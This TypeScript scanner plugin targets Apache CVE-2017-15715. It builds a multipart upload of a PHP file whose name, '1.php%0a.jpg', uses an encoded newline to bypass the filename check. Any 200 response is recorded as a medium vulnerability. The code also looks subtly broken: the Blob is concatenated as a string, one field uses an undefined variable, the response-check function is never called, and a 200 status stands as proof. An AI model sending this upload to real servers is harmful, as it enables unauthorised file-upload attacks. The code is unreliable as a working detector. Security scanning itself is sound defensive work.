
import db from '../../../app/web/db.ts';
import { HttpUtils } from '@24wings/core';
import { VulnerabilityLevel } from '../../../app/web/db/vuln.ts';
const pluginName='Apache-CVE-2017'
export async function endpoint(request: Request) {
    await detectVulnerability(request.url);
  }
  const DEFAULT_CONFIG = {
    timeout: 5000,
    userAgent: 'Apache-CVE-2017-15715-Detector/1.0',
    testPayload: 'shell.php\\x0A.jpg', // 包含换行符的测试文件名
  };
  
  // 主检测函数
  async function detectVulnerability(targetUrl: string) {
    // 创建一个 Blob 对象作为文件内容
    let fileContent = new Blob(['<?php phpinfo() ?>'], { type: 'application/octet-stream' });
  
    // 生成一个唯一的边界字符串
    let boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2);
  
    // 构造multipart/form-data消息体
    let body = '--' + boundary + '\r\n';
    body += 'Content-Disposition: form-data; name="filename"; filename*="UTF-8\'\'1.php%0a.jpg"\r\n';
    body += 'Content-Type: application/octet-stream\r\n\r\n';
    body += fileContent + '\r\n';
    body += '--' + boundary + '--\r\n';
  
    // 使用fetch发送请求
    const payloadRequest=new Request(targetUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
      },
      body: body,
    })
    const response = await fetch(payloadRequest.clone());

    if (response.status == 200) {
      await db.tables.vuln.insertOne({
        url: targetUrl,
        type:name,
        level: VulnerabilityLevel.Medium,
        payload: body,
        requestRaw: await HttpUtils.dumpRequest(payloadRequest.clone()),
        responseRow: await HttpUtils.dumpResponse(( response).clone()),
        pluginName,
      });
    }
    
  }
  
  // 响应特征检测
  async function checkResponseIndicators(response: Response): Promise<boolean> {
    // 状态码检测
    if (response.status === 200) return true;
  
    // 响应内容关键词检测
    const body = await response.text();
    const dangerPatterns = [
      /File name contains newline/i,
      /mod_mime/i,
      /Invalid character in filename/i,
    ];
  
    return dangerPatterns.some((pattern) => pattern.test(body));
  }
  
  
  export default{name:pluginName,endpoint,version:'1.0.0'}